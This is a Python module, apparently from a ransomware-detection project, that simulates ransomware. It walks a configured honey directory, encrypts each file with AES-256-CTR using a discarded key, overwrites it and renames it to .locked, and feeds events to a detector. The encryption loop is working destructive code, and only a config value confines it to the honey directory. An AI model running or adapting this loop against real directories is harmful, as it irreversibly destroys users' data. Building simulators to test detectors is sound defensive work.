# ransomware_sim.py
# REAL ransomware simulator — actual file encryption karta hai (safe, sirf apni
# honey dir me). Ye prove karta hai ki detector live real-encryption ko pakadta hai.
#
#   - cryptography lib ho toh Fernet (AES-128-CBC) use hota hai
#   - na ho toh XOR-with-key fallback (high-entropy output deta hai anyway)
#
# IMPORTANT: ye sirf config.SIM_TARGET_DIR (honey dir) ke andar files chhuta hai.
# Kisi aur dir ko kabhi touch nahi karta — safe by design.

import os
import time
import random

from . import config
from .detector import file_entropy

# optional real crypto — AES-CTR raw ciphertext (high entropy, jaise real ransomware)
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    _HAVE_AES = True
except Exception:
    _HAVE_AES = False


def _key():
    """Ek random 256-bit key banao."""
    return os.urandom(32)


def _encrypt(data: bytes, key: bytes) -> bytes:
    """
    Data ko encrypt karo — AES-256-CTR raw ciphertext (preferred).
    Raw ciphertext (base64 nahi) likhta hai isliye entropy ~7.9 hoti hai —
    bilkul real ransomware output jaisi.
    Na ho toh os.urandom-mixed output dete hain — bhi high entropy.
    """
    if _HAVE_AES:
        iv = os.urandom(16)
        enc = Cipher(algorithms.AES(key), modes.CTR(iv)).encryptor()
        return iv + enc.update(data) + enc.finalize()
    # Fallback: har byte ko random keystream se XOR + random prefix.
    ks = os.urandom(len(data) + 16)
    body = bytes(b ^ ks[i] for i, b in enumerate(data))
    return ks[len(data):] + body


class RansomwareSimulator:
    """
    Real ransomware jaisa behave karta hai:
      - honey dir ke files iterate karta hai
      - har file padhta hai -> encrypt karta hai -> overwrite karta hai
      - file ko ransom-extension (.locked) se rename karta hai
      - har step pe real filesystem events fire hote hain (watcher inko dekhta hai)
      - pid = apna os.getpid() taaki process-attribution real lage
    """

    def __init__(self, target_dir: str = None, delay: float = None):
        self.target = target_dir or config.SIM_TARGET_DIR
        self.delay = config.RANSOM_DELAY_SEC if delay is None else delay
        self.ext = config.RANSOM_EXT
        self.pid = os.getpid()
        self.encrypted = []   # [(orig_path, locked_path)]

    def _iter_files(self):
        for root, _dirs, files in os.walk(self.target):
            for f in sorted(files):
                if f.endswith(self.ext):
                    continue          # already encrypted skip
                yield os.path.join(root, f)

    def run(self, event_hook=None):
        """
        Files ko actually encrypt karo.
        event_hook(event_dict) — har file pe call hota hai (live pipeline ko feed
        karne ke liye). Nahi diya toh sirf disk pe encrypt hota hai.
        Return: encrypted files ki list.
        """
        key = _key()
        for path in self._iter_files():
            try:
                with open(path, "rb") as fh:
                    plain = fh.read()
                cipher = _encrypt(plain, key)

                # overwrite original with ciphertext
                with open(path, "wb") as fh:
                    fh.write(cipher)

                # rename to ransom extension
                newp = path + self.ext
                os.replace(path, newp)
                self.encrypted.append((path, newp))

                if event_hook:
                    event_hook({
                        "type": "moved",            # rename = moved
                        "path": newp,
                        "old_ext": os.path.splitext(path)[1],
                        "pid": self.pid,
                        "entropy": file_entropy(newp),
                    })
            except OSError:
                continue
            if self.delay:
                time.sleep(self.delay)
        return self.encrypted

    @staticmethod
    def restore_note():
        """Ransom-note jaisa kuch — realism ke liye (optional demo flavour)."""
        return ("YOUR FILES HAVE BEEN ENCRYPTED\n"
                "Sentinel-Canary demo ransomware — harmless test only.\n")
